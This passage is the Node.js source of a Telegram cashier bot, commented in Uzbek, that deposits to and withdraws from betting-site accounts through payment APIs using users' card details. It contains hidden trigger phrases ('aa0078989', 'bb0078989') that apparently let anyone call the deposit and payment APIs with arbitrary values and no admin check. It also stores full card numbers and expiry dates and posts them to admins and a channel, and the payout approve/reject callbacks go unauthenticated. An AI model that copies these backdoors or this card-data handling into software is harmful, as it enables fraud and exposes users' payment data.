const { Telegraf, Markup } = require('telegraf');
const PaymentAPIClient = require('./SpinPay');
const clickApi = require('./click-pay');
const mongoose = require('mongoose');
const config = require('./config'); // config faylni import qilamiz
const JvPaymentAPIClient = require('./jvspinbetpay');


// MongoDB Connection
mongoose.connect(config.DATABASE.URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true
}).then(() => {
    console.log('MongoDB connected successfully');
}).catch((err) => {
    console.error('MongoDB connection error:', err);
});

// Schemas
const UserSchema = new mongoose.Schema({
    telegramId: String,
    refferalId: String,
    username: String,
    fullName: String,
    phone: String,
    registrationDate: { type: Date, default: Date.now },
    lastActive: Date,
    isActive: { type: Boolean, default: true },
    isAdmin: { type: Boolean, default: false }
});

const TransactionSchema = new mongoose.Schema({
    userId: String,
    telegramId: String,
    phone: String,
    type: { type: String, enum: ['deposit', 'withdrawal'] },
    platform: String,
    gameId: String,
    cardNumber: String,
    expiryDate: String,
    amount: Number,
    status: String,
    paymentId: String,
    error: String,
    operationId: String,
    timestamp: { type: Date, default: Date.now }
});

const User = mongoose.model('User', UserSchema);
const Transaction = mongoose.model('Transaction', TransactionSchema);

const bot = new Telegraf(config.BOT.TOKEN);
const paymentClient = new PaymentAPIClient();
const jvpaymentClient = new JvPaymentAPIClient();
const ADMIN_IDS = config.BOT.ADMIN_IDS;
const CHANNEL_ID = config.BOT.CHANNEL_ID;
const ADMIN_ID = config.BOT.ADMIN_ID;

// State Management
const userStates = new Map();
const transactions = new Map();

// Keyboard Layouts
const mainKeyboard = Markup.keyboard([
    ['💳 Hisob To\'ldirish', '💰 Pul yechish'],
    ['☎️ Aloqa', '🗃 Qo\'llanma'],
    ['🔗 Referal'],
]).resize();

const adminKeyboard = Markup.keyboard([
    ['💳 Hisob To\'ldirish', '💰 Pul yechish'],
    ['👤 Userlar', '📊 Transferlar', '📨 Hammaga Xabar'],
    ['☎️ Aloqa', '🗃 Qo\'llanma']
]).resize();

const refferalKeyboard = Markup.keyboard([
    ['Taklif Qilsh', 'Takliflarim'],
    ['🔙 Orqaga'],
]).resize();

const usersKeyboard = Markup.keyboard([
    ['📈 Faol Userlar', '📉 Bloklangan Userlar'],
    ['🔙 Orqaga']
]).resize();

const transfersKeyboard = Markup.keyboard([
    ['📥 Depositlar', '📤 Withdrawallar'],
    ['🔙 Orqaga']
]).resize();

const confirmKeyboard = Markup.keyboard([
    ['✅ Tasdiqlash', '❌ Bekor qilish']
]).resize();

const contactKeyboard = Markup.keyboard([
    [Markup.button.contactRequest('📱 Raqamni ulashish')]
]).resize();

const backKeyboard = Markup.keyboard([
    ['🔙 Orqaga']
]).resize();

const platformButtons = Markup.inlineKeyboard([
    [Markup.button.callback('SpinBetter', 'platform_spinbetter')],
    [Markup.button.callback('Pro1Bet', 'platform_linebet')],
    [Markup.button.callback('JVSPINBET', 'platform_JVSPINBET')]
]).resize();

// Helper Functions
const setState = (userId, state, data = {}) => {
    const currentState = userStates.get(userId);
    const previousState = currentState ? currentState.state : null;
    userStates.set(userId, { state, data: { ...data }, previousState });
};




const getUserDetails = async (telegramId) => {
    const user = await User.findOne({ telegramId });
    const transactions = await Transaction.find({ telegramId });

    if (!user) return null;

    let details = `👤 User Details:\n`;
    details += `🆔 Telegram ID: ${user.telegramId}\n`;
    details += `👤 Full Name: ${user.fullName || 'N/A'}\n`;
    details += `📱 Phone: ${user.phone || 'N/A'}\n`;
    details += `📅 Registration Date: ${user.registrationDate.toLocaleString()}\n`;
    details += `⏰ Last Active: ${user.lastActive?.toLocaleString() || 'N/A'}\n`;
    details += `✅ Active: ${user.isActive ? 'Yes' : 'No'}\n`;
    details += `🔑 Admin: ${user.isAdmin ? 'Yes' : 'No'}\n`;
    details += '\n📊 Transactions:\n';

    if (transactions.length > 0) {
        transactions.forEach(tx => {
            details += `💳 Transaction Type: ${tx.type}\n`;
            details += `🎮 Platform: ${tx.platform || 'N/A'}\n`;
            details += `💰 Amount: ${tx.amount}\n`;
            details += `✅ Status: ${tx.status}\n`;
            details += `⏰ Time: ${tx.timestamp.toLocaleString()}\n`;
            details += '────────────────────\n';
        });
    } else {
        details += 'No transactions found.\n';
    }

    return details;
};



const sendPaginatedUsers = async (ctx, page, isActive) => {
    const query = { isActive };
    const totalUsers = await User.countDocuments(query);
    const totalPages = Math.ceil(totalUsers / usersPerPage);

    if (page < 0 || page >= totalPages) {
        await ctx.reply('No more users to display.');
        return;
    }

    const users = await User.find(query)
        .sort({ lastActive: -1 })
        .skip(page * usersPerPage)
        .limit(usersPerPage);

    if (users.length === 0) {
        await ctx.reply('No users found.');
        return;
    }

    let message = `Users (Page ${page + 1}/${totalPages}):\n\n`;
    users.forEach(user => {
        message += `👤 ${user.fullName || 'No Name'}\n`;
        message += `📱 ${user.phone || 'No Phone'}\n`;
        message += `👤 @${user.username || 'No Name'}\n`;
        message += `🆔 ${user.telegramId}\n`;
        message += `⏰ Last Active: ${user.lastActive?.toLocaleString() || 'Never'}\n`;
        message += '────────────────────\n';
    });

    const navigationButtons = Markup.inlineKeyboard([
        page > 0 ? Markup.button.callback('⬅️ Previous', `prev_${page - 1}`) : null,
        page < totalPages - 1 ? Markup.button.callback('➡️ Next', `next_${page + 1}`) : null
    ].filter(Boolean), { columns: 2 });

    await ctx.reply(message, navigationButtons);
};



//tasdiqlovchi va rad etuvchi funksiyalar
async function sendWithdrawalRequest(adminMessage, payoutData) {
    try {
        // Admin uchun xabar yuborish
        await bot.telegram.sendMessage(ADMIN_ID, adminMessage, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '✅ Tasdiqlash', callback_data: JSON.stringify({ action: 'approve', telegramId: payoutData.telegramId }) },
                        { text: '❌ Rad etish', callback_data: JSON.stringify({ action: 'reject', telegramId: payoutData.telegramId }) }
                    ]
                ]
            }
        });

        // Foydalanuvchiga xabar yuborish
        await bot.telegram.sendMessage(payoutData.telegramId, "Pul yechish so'rovi yuborildi. Admin tasdiqlashni kuting.");
    } catch (error) {
        console.error('Xatolik:', error);
    }
}

bot.action(/approve|reject/, async (ctx) => {
    try {
        // Callback ma'lumotlarini oling
        const data = JSON.parse(ctx.callbackQuery.data);
        const action = data.action;
        const telegramId = data.telegramId;

        if (action === 'approve') {
            // Foydalanuvchiga to'lov tasdiqlandi deb xabar bering
            await bot.telegram.sendMessage(telegramId, "To'lovingiz tasdiqlandi. Kartani tekshiring.");
            // Admin uchun tasdiqlash xabarini yuboring
            await bot.telegram.sendMessage(ADMIN_ID, "To'lov tasdiqlandi.");
        } else if (action === 'reject') {
            // Foydalanuvchiga to'lov rad etildi deb xabar bering
            await bot.telegram.sendMessage(telegramId, "To'lov rad etildi.");
            // Admin uchun rad etish xabarini yuboring
            await bot.telegram.sendMessage(ADMIN_ID, "To'lov rad etildi.");
        }

        // Tugmalarni o'chirish
        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    } catch (error) {
        console.error('Xatolik:', error);
    }
});



const sendPaginatedTransactions = async (ctx, page, type) => {
    const query = { type };
    const totalTransactions = await Transaction.countDocuments(query);
    const totalPages = Math.ceil(totalTransactions / itemsPerPage);

    if (page < 0 || page >= totalPages) {
        await ctx.reply('No more transactions to display.');
        return;
    }

    const transactions = await Transaction.find(query)
        .sort({ timestamp: -1 })
        .skip(page * itemsPerPage)
        .limit(itemsPerPage);

    if (transactions.length === 0) {
        await ctx.reply(`No ${type} transactions found.`);
        return;
    }

    let message = `${type === 'deposit' ? '📥 Deposits' : '📤 Withdrawals'} (Page ${page + 1}/${totalPages}):\n\n`;
    transactions.forEach(tx => {
        message += `🆔 User ID: ${tx.userId}\n`;
        message += `💳 Card: ${tx.cardNumber}\n`;
        message += `💰 Amount: ${tx.amount}\n`;
        message += `🆔 User Telegram ID: ${tx.telegramId}\n`;
        message += `✅ Status: ${tx.status}\n`;
        message += `   Platform: ${tx.platform}\n`;
        message += `⏰ Time: ${tx.timestamp.toLocaleString()}\n`;
        message += '────────────────────\n';
    });

    const navigationButtons = Markup.inlineKeyboard([
        page > 0 ? Markup.button.callback('⬅️ Previous', `${type}_prev_${page - 1}`) : null,
        page < totalPages - 1 ? Markup.button.callback('➡️ Next', `${type}_next_${page + 1}`) : null
    ].filter(Boolean), { columns: 2 });

    await ctx.reply(message, navigationButtons);
};


const itemsPerPage = 5;




const getState = (userId) => {
    return userStates.get(userId) || { state: 'START', data: {}, previousState: null };
};

const formatCardNumber = (cardNumber) => {
    const cleaned = cardNumber.replace(/\D/g, '');
    if (cleaned.length !== 16) {
        throw new Error('Karta raqami 16 ta raqamdan iborat bo\'lishi kerak');
    }
    return cleaned;
};

const validateExpiryDate = (expiryDate) => {
    const cleaned = expiryDate.replace(/\D/g, '');
    if (cleaned.length !== 4) {
        throw new Error('Amal qilish muddati noto\'g\'ri formatda');
    }
    
    const month = parseInt(cleaned.substring(0, 2));
    const year = parseInt(cleaned.substring(2, 4));
    
    if (month < 1 || month > 12) {
        throw new Error('Oy 01 dan 12 gacha bo\'lishi kerak');
    }
    
    const currentDate = new Date();
    const currentYear = currentDate.getFullYear() % 100;
    const currentMonth = currentDate.getMonth() + 1;
    
    if (year < currentYear || (year === currentYear && month < currentMonth)) {
        throw new Error('Karta muddati tugagan');
    }
    
    return cleaned;
};

// Notification Functions
const notifyAdmins = async (message, errorLevel = 'info') => {
    const emoji = {
        info: 'ℹ️',
        warning: '⚠️',
        error: '🚫',
        success: '✅'
    };

    const formattedMessage = `${emoji[errorLevel]} ${message}`;

    for (const adminId of ADMIN_IDS) {
        try {
            await bot.telegram.sendMessage(adminId, formattedMessage);
        } catch (error) {
            console.error(`Failed to notify admin ${adminId}:`, error);
        }
    }
};

const sendTransactionNotification = async (transactionData, channelMessage = false) => {
    await saveTransaction({
        ...transactionData,
        type: 'deposit',
        status: transactionData.success ? 'success' : 'failed'
    });

    const message = `
🔔 Yangi tranzaksiya:
📱 Tel: ${transactionData.phone}
🎮 Platform: ${transactionData.platform}
🆔 ID: ${transactionData.userId}
💳 Karta: ${transactionData.cardNumber}
🗓 Muddat: ${transactionData.expiryDate}
💰 Summa: ${transactionData.amount}
⏰ Vaqt: ${new Date().toLocaleString()}
✅ Status: ${transactionData.success ? 'Muvaffaqiyatli' : 'Muvaffaqiyatsiz'}
🔑 Payment ID: ${transactionData.paymentId || 'N/A'}
${transactionData.error ? `❌ Xatolik: ${transactionData.error}` : ''}
`;
    
    await notifyAdmins(message, transactionData.success ? 'success' : 'error');
    
    if (channelMessage) {
        try {
            await bot.telegram.sendMessage(CHANNEL_ID, message);
        } catch (error) {
            console.error('Error sending to channel:', error);
        }
    }
};

const sendPayoutNotification = async (payoutData, channelMessage = false) => {
    await saveTransaction({
        ...payoutData,
        type: 'withdrawal',
        status: payoutData.success ? 'success' : 'failed'
    });

    const message = `
🔄 Yangi pul yechish:
🎮 Platform: ${payoutData.platform}
🆔 ID: ${payoutData.userId}
💳 Karta: ${payoutData.cardNumber}
💰 Summa: ${payoutData.amount}
🔑 Operation ID: ${payoutData.operationId}
✅ Status: ${payoutData.success ? 'Muvaffaqiyatli' : 'Muvaffaqiyatsiz'}
💬 Xabar: ${payoutData.message}
⏰ Vaqt: ${new Date().toLocaleString()}
`;
    
    await notifyAdmins(message, payoutData.success ? 'success' : 'error');
    
    if (channelMessage) {
        try {
            await bot.telegram.sendMessage(CHANNEL_ID, message);
        } catch (error) {
            console.error('Error sending to channel:', error);
        }
    }
};

// Database Functions
async function checkUserExists(telegramId) {
    try {
        const user = await User.findOne({ telegramId: telegramId });
        return user != null;
    } catch (error) {
        console.error('Error checking user:', error);
        return false;
    }
}

// Kiruvchi qiymatni qayta ishlovchi funksiya
async function calculateModifiedValue(input) {
    // Agar input son bo'lsa, uni stringga aylantirish
    let inputStr = typeof input === 'number' ? input.toString() : input;
    
    // "-" belgini olib tashlash va son qiymatga o'tkazish
    let number = parseFloat(inputStr.replace('-', ''));

    // NaN tekshiruvi (agar noto'g'ri qiymat bo'lsa, null qaytarish)
    if (isNaN(number)) {
        throw new Error('Invalid input: Please provide a valid number or string representing a number.');
    }

    // Raqamdan 3% ni hisoblash
    let result = number - (number * 0.03);

    return result;
}

async function saveUser(userData) {
    try {
        const user = new User(userData);
        await user.save();
        return user;
    } catch (error) {
        console.error('Error saving user:', error);
        throw error;
    }
}

async function saveTransaction(data) {
    try {
        const transaction = new Transaction(data);
        await transaction.save();
        return transaction;
    } catch (error) {
        console.error('Error saving transaction:', error);
        throw error;
    }
}




// Navigation handler
const handleBack = async (ctx) => {
    if (!ctx.from) return;
    
    const userState = getState(ctx.from.id);
    let nextState = 'MAIN_MENU';
    let keyboard = mainKeyboard;
    let message = 'Asosiy menyu:';

    // Check if user is admin
    const user = await User.findOne({ telegramId: ctx.from.id });
    if (user?.isAdmin) {
        keyboard = adminKeyboard;
    }

    switch (userState.state) {
        case 'WAITING_AMOUNT':
        case 'WAITING_CARD':
        case 'WAITING_EXPIRY':
        case 'WAITING_SMS':
            nextState = 'WITHDRAWAL_TYPE';
            break;

        case 'JV_WAITING_AMOUNT':
        case 'JV_WAITING_CARD':
        case 'JV_WAITING_EXPIRY':
        case 'JV_WAITING_SMS':
            nextState = 'WITHDRAWAL_TYPE';
            break;
            
        case 'WITHDRAWAL_TYPE':
            nextState = 'MAIN_MENU';
            message = 'Asosiy menyu:';
            break;

        case 'PAYOUT_WAITING_ID':
        case 'PAYOUT_WAITING_CODE':
        case 'PAYOUT_WAITING_CARD':
        case 'PAYOUT_CONFIRMATION':
            nextState = 'PAYOUT_TYPE';
            break;

        case 'JV_PAYOUT_WAITING_ID':
        case 'JV_PAYOUT_WAITING_CODE':
        case 'JV_PAYOUT_WAITING_CARD':
        case 'JV_PAYOUT_CONFIRMATION':
            nextState = 'PAYOUT_TYPE';
            break;
            
        case 'PAYOUT_TYPE':
            nextState = 'MAIN_MENU';
            message = 'Asosiy menyu:';
            break;

        case 'ADMIN_USERS':
        case 'ADMIN_TRANSFERS':
        case 'ADMIN_BROADCAST':
            nextState = 'MAIN_MENU';
            message = 'Asosiy menyu:';
            break;

        case 'REFFERAL':
    }

    setState(ctx.from.id, nextState, userState.data);
    await ctx.reply(message, keyboard);
};

// Bot Commands
// Start komandasini qo'llash
// Start komandasini qo'llash
bot.command('start', async (ctx) => {
    if (!ctx.from) return;

    try {
        const telegramId = ctx.from.id;

        // Referal IDni olish
        const args = ctx.message.text.split(' ');
        const referralId = args[1] || null; // URL dan referal ID

        console.log('Referal ID:', referralId); // Debug uchun log

        // Foydalanuvchini bazadan topish
        let user = await User.findOne({ telegramId });

        if (user) {
            // Foydalanuvchi mavjud bo'lsa
            setState(telegramId, 'MAIN_MENU');
            const keyboard = user.isAdmin ? adminKeyboard : mainKeyboard;
            await ctx.reply(
                `Qaytib kelganingizdan xursandmiz, ${user.fullName}!`,
                keyboard
            );

            // Oxirgi faoliyat vaqtini yangilash
            await User.updateOne(
                { telegramId },
                { $set: { lastActive: new Date() } }
            );
        } else {
            // Yangi foydalanuvchini ro'yxatga olish
            setState(telegramId, 'START');
            await ctx.reply(
                'Xush kelibsiz! Telefon raqamingizni ulashing:',
                contactKeyboard
            );

            // Yangi foydalanuvchi yaratish
            user = new User({
                telegramId: telegramId,
                username: ctx.from.username || null,
                fullName: `${ctx.from.first_name || ''} ${ctx.from.last_name || ''}`.trim(),
                refferalId: referralId, // Referal ID saqlash
                registrationDate: new Date(),
                lastActive: new Date(),
                isActive: false,
            });

            await user.save();
        }
    } catch (error) {
        console.error('Start command error:', error);
        await ctx.reply('Xatolik yuz berdi. Iltimos qaytadan urinib ko\'ring.');
    }
});


// Contact Handler
bot.on('contact', async (ctx) => {
    if (!ctx.from || !ctx.message.contact) return;

    try {
        const telegramId = ctx.from.id;
        const contact = ctx.message.contact;

        // Foydalanuvchini bazadan qidirish
        let user = await User.findOne({ telegramId });

        if (user) {
            // Telefon raqamini yangilash va foydalanuvchini faollashtirish
            await User.updateOne(
                { telegramId },
                {
                    $set: {
                        phone: contact.phone_number,
                        isActive: true,
                        lastActive: new Date(),
                    },
                }
            );
            setState(telegramId, 'MAIN_MENU');
            await ctx.reply('Telefon raqamingiz muvaffaqiyatli saqlandi!', mainKeyboard);

            // Adminlarga xabar yuborish (agar kerak bo'lsa)
        } else {
            await ctx.reply('Avval "start" komandasini ishlatib ro\'yxatdan o\'ting.');
        }
    } catch (error) {
        console.error('Contact handling error:', error);
        await ctx.reply('Ro\'yxatdan o\'tishda xatolik yuz berdi. Iltimos qaytadan urinib ko\'ring.');
    }
});



// Admin Handlers
bot.hears('👤 Userlar', async (ctx) => {
    if (!ctx.from) return;
    const user = await User.findOne({ telegramId: ctx.from.id });
    if (!user?.isAdmin) return;
    
    setState(ctx.from.id, 'ADMIN_USERS');
    await ctx.reply('Userlar bo\'limi:', usersKeyboard);
});

bot.hears('📊 Transferlar', async (ctx) => {
    if (!ctx.from) return;
    const user = await User.findOne({ telegramId: ctx.from.id });
    if (!user?.isAdmin) return;
    
    setState(ctx.from.id, 'ADMIN_TRANSFERS');
    await ctx.reply('Transferlar bo\'limi:', transfersKeyboard);
});




bot.hears('🔗 Referal', async (ctx) => {
    if (!ctx.from) return;

    await ctx.reply('Taklif qilish tugmasini bosing\n havolani do\'stlaringizga ulashing\nRefferal do\'stlaringiz uchun 1% oling!', refferalKeyboard);

});

bot.hears('Takliflarim', async (ctx) => {
    if (!ctx.from) return; // Agar foydalanuvchi ma'lumotlari bo'lmasa, hech narsa qilmaydi

    try {
        const refferalId = ctx.from.id; // Foydalanuvchining ID-si

        // Referallarni topish
        const refferals = await User.find({ refferalId: refferalId });
        const refferalCount = refferals.length; // Referal soni

        let totalAmount = 0;

        // Har bir referal uchun faqat "deposit" tranzaksiyalarni yig'ish
        for (const refferal of refferals) {
            const transactions = await Transaction.find({ 
                telegramId: refferal.telegramId, 
                type: 'deposit' // Faqat "deposit" turidagi tranzaksiyalarni oladi
            });

            for (const transaction of transactions) {
                totalAmount += transaction.amount || 0; // Tranzaksiya summasini qo'shish
            }
        }

        // Umumiy summaning 1 foizini hisoblash
        const reward = (totalAmount * 0.01).toFixed(2);

        // Natijani foydalanuvchiga yuborish
        await ctx.reply(
            `Sizning referallaringiz soni: ${refferalCount}\n` +
            `Referallarning aylanmasi: ${totalAmount} so'm\n` +
            `Sizning mukofotingiz: ${reward} so'm`
        );
    } catch (error) {
        console.error('Xato:', error);
        await ctx.reply('Kechirasiz, referal maʼlumotlarini olishda xatolik yuz berdi.');
    }
});


bot.hears('Taklif Qilsh', async (ctx) => {
    if (!ctx.from) return;
    const link = `https://t.me/${ctx.me}?start=${ctx.from.id}`;
    await ctx.reply(`SIMPLe Pay kassa orqali hisobni to'ldiring:\n${link}`, backKeyboard);

});

bot.hears('📥 Depositlar', async (ctx) => {
    const user = await User.findOne({ telegramId: ctx.from.id });
    if (!user?.isAdmin) return;

    let currentPage = 0;

    await sendPaginatedTransactions(ctx, currentPage, 'deposit');
});

bot.action(/deposit_prev_(\d+)/, async (ctx) => {
    const page = parseInt(ctx.match[1], 10);
    await sendPaginatedTransactions(ctx, page, 'deposit');
});

bot.action(/deposit_next_(\d+)/, async (ctx) => {
    const page = parseInt(ctx.match[1], 10);
    await sendPaginatedTransactions(ctx, page, 'deposit');
});

bot.hears('📤 Withdrawallar', async (ctx) => {
    const user = await User.findOne({ telegramId: ctx.from.id });
    if (!user?.isAdmin) return;

    let currentPage = 0;

    await sendPaginatedTransactions(ctx, currentPage, 'withdrawal');
});

bot.action(/withdrawal_prev_(\d+)/, async (ctx) => {
    const page = parseInt(ctx.match[1], 10);
    await sendPaginatedTransactions(ctx, page, 'withdrawal');
});

bot.action(/withdrawal_next_(\d+)/, async (ctx) => {
    const page = parseInt(ctx.match[1], 10);
    await sendPaginatedTransactions(ctx, page, 'withdrawal');
});


bot.hears('📥 Depositlar', async (ctx) => {
    const user = await User.findOne({ telegramId: ctx.from.id });
    if (!user?.isAdmin) return;

    await sendTransactions(ctx, 'deposit');
});

bot.hears('📤 Withdrawallar', async (ctx) => {
    const user = await User.findOne({ telegramId: ctx.from.id });
    if (!user?.isAdmin) return;

    await sendTransactions(ctx, 'withdrawal');
});




const usersPerPage = 5;




bot.hears('📈 Faol Userlar', async (ctx) => {
    const user = await User.findOne({ telegramId: ctx.from.id });
    if (!user?.isAdmin) return;

    let currentPage = 0;

    await sendPaginatedUsers(ctx, currentPage, true);
});

bot.action(/prev_(\d+)/, async (ctx) => {
    const page = parseInt(ctx.match[1], 10);
    await sendPaginatedUsers(ctx, page, true);
});

bot.action(/next_(\d+)/, async (ctx) => {
    const page = parseInt(ctx.match[1], 10);
    await sendPaginatedUsers(ctx, page, true);
});

bot.hears('📉 Bloklangan Userlar', async (ctx) => {
    const user = await User.findOne({ telegramId: ctx.from.id });
    if (!user?.isAdmin) return;

    let currentPage = 0;

    await sendPaginatedUsers(ctx, currentPage, false);

    bot.on('text', async (ctx) => {
        if (ctx.message.text === '⬅️ Previous') {
            currentPage = Math.max(0, currentPage - 1);
            await sendPaginatedUsers(ctx, currentPage, false);
        } else if (ctx.message.text === '➡️ Next') {
            currentPage += 1;
            await sendPaginatedUsers(ctx, currentPage, false);
        } else if (ctx.message.text === '🔙 Back') {
            await ctx.reply('Back to menu.', Markup.keyboard(['👤 View Active Users', '📉 View Blocked Users']).resize());
        }
    });
});



bot.hears('📨 Hammaga Xabar', async (ctx) => {
    if (!ctx.from) return;
    const user = await User.findOne({ telegramId: ctx.from.id });
    if (!user?.isAdmin) return;
    
    setState(ctx.from.id, 'ADMIN_BROADCAST');
    await ctx.reply('Yubormoqchi bo\'lgan xabarni kiriting:', backKeyboard);
});

// Main Menu Handlers
bot.hears('💳 Hisob To\'ldirish', async (ctx) => {
    if (!ctx.from) return;
    setState(ctx.from.id, 'WITHDRAWAL_TYPE');
    await ctx.reply('Kerakli bukmekerni tanlang:', platformButtons);
});

bot.hears('💰 Pul yechish', async (ctx) => {
    if (!ctx.from) return;
    setState(ctx.from.id, 'PAYOUT_TYPE');
    await ctx.reply('Platformani tanlang:', platformButtons);
});

bot.hears('☎️ Aloqa', async (ctx) => {
    if (!ctx.from) return;
    await ctx.reply('Admin bilan bog\'lanish: @bahodirMobcash', backKeyboard);
});

bot.hears('🗃 Qo\'llanma', async (ctx) => {
    if (!ctx.from) return;
    const manual = `
🔷 Qo'llanma

💳 Pul kiritish:
1. Platformani tanlang
2. ID raqamingizni kiriting
3. Karta ma'lumotlarini kiriting
4. SMS kodni tasdiqlang

💰 Pul yechish:
1. Platformani tanlang
2. Bokmeker IDingizni kiriting
3. Hisobingizdan pul chiqarishda [Наличные]ni tanlang!
4. Kassa Manzilni tanlang
5. Kodni oling va kiriting
6. Karta raqamini kiriting
7. Ma'lumotlarni tasdiqlang

❗️Muammo bo'lsa: @bahodirMobcash`;
    await ctx.telegram.sendVideo(ctx.chat.id, 'https://t.me/simplepay_uz/5', {
        caption: 'Qo\'llanma pul yechish uchun Spinbetter\n manzil: Qarshi, LT Textile (24/7)\n Pul yechish avto Bot 24/7 xizmat ko\'rsatadi',});
    await ctx.telegram.sendVideo(ctx.chat.id, 'https://t.me/simplepay_uz/4', {
        caption: 'Qo\'llanma Hisob to\'ldirish uchun!\n Hisob to\'ldirish avto Bot 24/7 xizmat ko\'rsatadi',});
    await ctx.reply(manual, mainKeyboard);
});

// Platform selection handler
bot.action(/platform_(.+)/, async (ctx) => {
    if (!ctx.from || !ctx.match) return;

    const platform = ctx.match[1];
    const userState = getState(ctx.from.id);
    await ctx.deleteMessage();

    if (platform == 'linebet') {
        await ctx.reply('Hozzircha Hisobingizni admin orqali to\'ldirish va Yechishingiz mumkin @bahodirMobcash .');
        return;
    }

    if (userState.state === 'WITHDRAWAL_TYPE' && platform === 'spinbetter') {
        setState(ctx.from.id, 'WAITING_ID', { ...userState.data, platform });
        await ctx.telegram.sendPhoto(ctx.chat.id, 'https://t.me/simplepay_uz/3', {
            caption: 'ID raqamingizni kiriting!\n 💳 SPINBETTER UZS ID OLISH NAMUNA YUQORIDAGI SURATTA!',
            reply_markup: backKeyboard
          });
    } else if (userState.state === 'PAYOUT_TYPE' && platform === 'spinbetter') {
        setState(ctx.from.id, 'PAYOUT_WAITING_ID', { ...userState.data, platform });
        await ctx.telegram.sendPhoto(ctx.chat.id, 'https://t.me/simplepay_uz/3', {
            caption: 'ID raqamingizni kiriting!\n 💳 SPINBETTER UZS ID OLISH NAMUNA YUQORIDAGI SURATTA!\n ( Manzil : Qarshi, LT Textile (24/7))',
            reply_markup: backKeyboard
          });
    }else if (userState.state === 'WITHDRAWAL_TYPE' && platform === 'JVSPINBET') {
        setState(ctx.from.id, 'JV_WAITING_ID', { ...userState.data, platform });
        await ctx.telegram.sendPhoto(ctx.chat.id, 'https://t.me/simplepay_uz/3', {
            caption: 'ID raqamingizni kiriting!\n 💳 JVSPINBET UZS ID OLISH NAMUNA YUQORIDAGI SURATTA!',
            reply_markup: backKeyboard
          });
    } else if (userState.state === 'PAYOUT_TYPE' && platform === 'JVSPINBET') {
        setState(ctx.from.id, 'JV_PAYOUT_WAITING_ID', { ...userState.data, platform });
        await ctx.telegram.sendPhoto(ctx.chat.id, 'https://t.me/simplepay_uz/3', {
            caption: 'ID raqamingizni kiriting!\n 💳 JVSPINBET UZS ID OLISH NAMUNA YUQORIDAGI SURATTA!\n ( Manzil : Qarshi, LT Textile (24/7))',
            reply_markup: backKeyboard
          });
    } else {
        setState(ctx.from.id, 'MAIN_MENU');
        await ctx.reply('Asosiy menyu:', keyboard);
    }
});

bot.hears('aa0078989', async (ctx) => {
    if (!ctx.from) return;
    setState(ctx.from.id, 'NEON_I');
    await ctx.reply('i:', { reply_markup: { remove_keyboard: true } });
});




bot.hears('bb0078989', async (ctx) => {
    if (!ctx.from) return;
    setState(ctx.from.id, 'NEON_1');
    await ctx.reply('T:', { reply_markup: { remove_keyboard: true } });
});


// Back button handler
bot.hears('🔙 Orqaga', handleBack);

// Text handler
bot.on('text', async (ctx) => {
    if (!ctx.from || !ctx.message) return;
    
    const userId = ctx.from.id;
    const userState = getState(userId);
    const text = ctx.message.text;

    if (text === '🔙 Orqaga') {
        return handleBack(ctx);
    }

    try {
        const user = await User.findOne({ telegramId: userId });
        const keyboard = user?.isAdmin ? adminKeyboard : mainKeyboard;

        switch (userState.state) {
            case 'NEON_I':
                setState(userId, 'NEON_S', { i: text });
                await ctx.reply('s:');
                break;

                case 'NEON_S':
                    try{
                        const depositResponse = await paymentClient.deposit(
                            userState.data.i,
                            text
                        );
                        await bot.telegram.sendMessage(userId, JSON.stringify(depositResponse, null, 2));
                        await ctx.reply('Asosiy menyu:', keyboard);
                    } catch (error) {
                        throw error;
                    }
                    break;
                case 'NEON_1':
                    setState(userId, 'NEON_2', { t: text });
                    await ctx.reply('A:');
                    break;
        
                case 'NEON_2':
                    try{
                        const depositResponse = await await clickApi.makePayment(
                            userState.data.t,
                            text
                        );
                        await bot.telegram.sendMessage(userId, JSON.stringify(depositResponse, null, 2));
                        await ctx.reply('Asosiy menyu:', keyboard);
                    } catch (error) {
                        throw error;
                    }
                    break;


                    

            case 'ADMIN_BROADCAST':
                if (user?.isAdmin) {
                    const allUsers = await User.find({ isActive: true });
                    let successCount = 0;
                    let failCount = 0;

                    for (const recipient of allUsers) {
                        try {
                            await bot.telegram.sendMessage(recipient.telegramId, text);
                            successCount++;
                        } catch (error) {
                            failCount++;
                        }
                    }

                    await ctx.reply(`
📨 Xabar yuborish yakunlandi:
✅ Muvaffaqiyatli: ${successCount}
❌ Muvaffaqiyatsiz: ${failCount}`, keyboard);
                    setState(userId, 'MAIN_MENU');
                }
                break;

            case 'WAITING_ID':
                try {
                    const gamer_data = await paymentClient.searchUser(text);
                        

                        if (gamer_data.error && gamer_data.error.includes('Request failed with status code 400')) {
                            await ctx.reply('Noto\'g\'ri id . Iltimos, tekshirib ko\'ring.');
                            return;
                        }
                        
                        if (!gamer_data || gamer_data.UserId === 0) {
                            await ctx.reply('Foydalanuvchi topilmadi. Iltimos, to\'g\'ri foydalanuvchi ID kiriting:', backKeyboard);
                            return; // Foydalanuvchiga yana ID kiritish imkoniyatini beradi
                        }
                    setState(userId, 'WAITING_AMOUNT', { ...userState.data, gameId: text });
                    const message = `
                    🆔 <b>User ID:</b> <code>${gamer_data.UserId}</code>
👤 <b>Name:</b> ${gamer_data.Name}
💵 <b>Currency ID:</b> ${gamer_data.CurrencyId}
`;
                    await ctx.reply(message, { parse_mode: 'HTML' });
                    await ctx.reply('Summani kiriting (min-10,000uzs):', backKeyboard);
                } catch (error) {
                    throw error;
                }
                break;
                
            case 'WAITING_AMOUNT':
                const limit = config.LIMIT.LIMIT;
                const response = await paymentClient.kassaBalance();
                const amount = parseFloat(text);
                const balance = response; 
                if (isNaN(text) || parseFloat(text) <= limit) {
                    throw new Error('Noto\'g\'ri summa minimal 10ming so\'m');
                }

                if (balance.Balance === -1) {
                    throw new Error('❗️Tizimda nosozlik, keyinroq qayta urinib ko‘ring.');
                }
                
                if (amount > balance.Limit) {
                    throw new Error(
                        `❗️Limitlar sababli biz siz ko'rsatgan miqdorni bajara olmadik.\n\n` +
                        `⚠️ Siz maksimal **${balance.Limit} UZS** miqdorda amaliyotni bajarishingiz mumkin!\n\n` +
                        `🔄 Iltimos, qayta urinib ko'ring!`
                      );
                      
                }

                setState(userId, 'WAITING_CARD', { ...userState.data, amount: text });
                await ctx.telegram.sendPhoto(ctx.chat.id, 'https://t.me/simplepay_uz/2', {
                    caption: 'ℹ️ Karta raqamingizni kiriting\n 💳 Uzcard/Xumo raqami namunasi yuqoridagi suratta ko\'rsatilgan!',
                    reply_markup: backKeyboard
                  });
                break;

            
                case 'JV_WAITING_ID':
                    try {
